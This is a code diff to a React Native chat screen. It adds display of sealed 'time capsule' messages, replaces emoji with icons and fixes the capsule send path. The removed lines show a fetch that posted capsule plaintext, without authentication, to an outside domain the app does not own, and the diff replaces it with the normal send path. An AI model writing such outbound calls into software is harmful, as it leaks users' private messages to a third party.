@@ -23,7 +23,7 @@ import {
   PushPin, X, ArrowFatLinesUp,
   Camera, Plus, LinkSimple, UserCircle, Images, MagnifyingGlass,
   Microphone, Play, Pause, ShareFat, WarningCircle, Users, Heart, Translate, BookmarkSimple, PaintBrush, Checks, CheckCircle, Check,
-  ChatCircleText, Phone, VideoCamera, Smiley, Hourglass, Calendar,
+  ChatCircleText, Phone, VideoCamera, Smiley, Hourglass, Calendar, Flame,
 } from 'phosphor-react-native';
 import * as Haptics from 'expo-haptics';
 import * as ImagePicker from 'expo-image-picker';
@@ -351,10 +351,10 @@ function ReplyCard({
   const { colors, radius } = useTheme();
   const preview = isDeleted
     ? 'Deleted message'
-    : kind === 'image' ? (content?.trim() ? `📷 ${content.trim()}` : '📷 Photo')
-    : kind === 'voice' ? '🎙️ Voice message'
-    : kind === 'link' ? '🔗 Link'
-    : kind === 'contact' ? '👤 Contact'
+    : kind === 'image' ? (content?.trim() ? content.trim() : 'Photo')
+    : kind === 'voice' ? 'Voice message'
+    : kind === 'link' ? 'Link'
+    : kind === 'contact' ? 'Contact'
     : (content ?? '').slice(0, 80);
 
   return (
@@ -478,13 +478,13 @@ function PinnedMessageBanner({
 }: { content: string | null; kind: string; onUnpin: () => void }) {
   const { colors } = useTheme();
   const label = kind === 'image'
-    ? (content?.trim() ? `📷 ${content.trim()}` : '📷 Photo')
+    ? (content?.trim() ? content.trim() : 'Photo')
     : kind === 'voice'
-      ? '🎙️ Voice'
+      ? 'Voice'
       : kind === 'link'
-        ? '🔗 Link'
+        ? 'Link'
         : kind === 'contact'
-          ? '👤 Contact'
+          ? 'Contact'
           : (content ?? '');
   return (
     <Animated.View
@@ -945,6 +945,55 @@ function DMBubble({
               </View>
             ) : null}
           </View>
+        </Pressable>
+      );
+    }
+
+    // A capsule stays sealed until its unlock time. Without this branch the
+    // bubble fell through to plain text and rendered the raw JSON payload —
+    // the feature had a composer and a send path but nothing to display it.
+    if (message.kind === 'capsule') {
+      let sealedText = '';
+      let unlockAt: number | null = null;
+      try {
+        const payload = JSON.parse(message.content ?? '{}');
+        sealedText = typeof payload?.text === 'string' ? payload.text : '';
+        unlockAt = payload?.unlockAt ? new Date(payload.unlockAt).getTime() : null;
+      } catch {
+        // Malformed payload: show it as sealed rather than leaking JSON.
+      }
+      const unlocked = unlockAt !== null && Date.now() >= unlockAt;
+      const opensOn = unlockAt
+        ? new Date(unlockAt).toLocaleDateString(undefined, { day: 'numeric', month: 'short', year: 'numeric' })
+        : null;
+
+      return (
+        <Pressable
+          onLongPress={onLongPress}
+          accessibilityRole="text"
+          accessibilityLabel={unlocked ? `Time capsule, opened. ${sealedText}` : `Sealed time capsule${opensOn ? `, opens ${opensOn}` : ''}`}
+          style={{
+            padding: 12,
+            borderRadius: 16,
+            borderWidth: StyleSheet.hairlineWidth,
+            borderColor: colors.accent,
+            backgroundColor: colors.accentMuted,
+            maxWidth: 280,
+          }}
+        >
+          <View style={{ flexDirection: 'row', alignItems: 'center', gap: 6, marginBottom: unlocked ? 6 : 0 }}>
+            <Hourglass color={colors.accent} size={15} weight="bold" />
+            <Text style={{ color: colors.accent, fontSize: 12, fontWeight: '800' }}>
+              {unlocked ? 'Time Capsule' : 'Sealed'}
+            </Text>
+          </View>
+          {unlocked ? (
+            <Text style={{ color: colors.text, fontSize: 15, lineHeight: 21 }}>{sealedText}</Text>
+          ) : (
+            <Text style={{ color: colors.textSecondary, fontSize: 13, marginTop: 4 }}>
+              {opensOn ? `Opens ${opensOn}` : 'Opens later'}
+            </Text>
+          )}
         </Pressable>
       );
     }
@@ -2639,7 +2688,7 @@ function DMViewInner({ id, echoId, echoTitle, echoPreview, echoAuthor }: DMViewP
         message: `Translate the following message to English. If it is already English, translate it to Spanish instead. Output only the translation, no quotes or notes:\n\n${msg.content}`,
         onEvent: e => { if (e.type === 'text_delta') { acc += e.delta; setTranslations(prev => ({ ...prev, [msg.id]: acc.trim() })); } },
       });
-      setTranslations(prev => ({ ...prev, [msg.id]: acc.trim() || ', ' }));
+      setTranslations(prev => ({ ...prev, [msg.id]: acc.trim() || '-' }));
     } catch {
       showToast('Couldn’t translate right now', 'Offline');
       setTranslations(prev => { const next = { ...prev }; delete next[msg.id]; return next; });
@@ -2856,7 +2905,7 @@ function DMViewInner({ id, echoId, echoTitle, echoPreview, echoAuthor }: DMViewP
               {conversation.isVerified && <SealCheck color={colors.accent} size={14} weight="fill" />}
               {streak >= 2 && (
                 <View style={{ flexDirection: 'row', alignItems: 'center', gap: 1, backgroundColor: colors.accentMuted, borderRadius: 999, paddingHorizontal: 7, paddingVertical: 2 }}>
-                  <Text style={{ fontSize: 11 }}>🔥</Text>
+                  <Flame color={colors.accent} size={11} weight="fill" />
                   <Text style={{ color: colors.accent, fontSize: 11.5, fontWeight: '800' }}>{streak}</Text>
                 </View>
               )}
@@ -3462,7 +3511,7 @@ function DMViewInner({ id, echoId, echoTitle, echoPreview, echoAuthor }: DMViewP
                     ) : null}
                     {selected && (
                       <View style={{ position: 'absolute', top: 5, right: 5, width: 18, height: 18, borderRadius: 9, backgroundColor: colors.accent, alignItems: 'center', justifyContent: 'center' }}>
-                        <Text style={{ color: '#fff', fontSize: 11, fontWeight: '900' }}>✓</Text>
+                        <Check color="#fff" size={11} weight="bold" />
                       </View>
                     )}
                   </Pressable>
@@ -3608,15 +3657,17 @@ function DMViewInner({ id, echoId, echoTitle, echoPreview, echoAuthor }: DMViewP
                   unlockDate.setDate(unlockDate.getDate() + capsuleDurationDays);
                   const payload = { type: 'capsule', text: capsuleText.trim(), unlockAt: unlockDate.toISOString() };
                   const content = JSON.stringify(payload);
+                  // Sent through the same path as every other message.
+                  // This used to POST to https://api.echocorp.dev/v1/dms/send:
+                  // a domain Echo does not own and which does not resolve, with no
+                  // auth header and the capsule's plaintext in the body. It could
+                  // never have delivered, and had that domain ever been registered
+                  // it would have received private messages.
                   try {
-                    await fetch('https://api.echocorp.dev/v1/dms/send', {
-                      method: 'POST',
-                      headers: { 'Content-Type': 'application/json' },
-                      body: JSON.stringify({ recipientId: conversation?.userId || id, content })
-                    });
+                    await sendRemote.mutateAsync({ content });
                     setCapsuleModalOpen(false);
                     setCapsuleText('');
-                  } catch (e) {
+                  } catch {
                     Alert.alert('Error', 'Failed to send Time Capsule');
                   }
                 }}
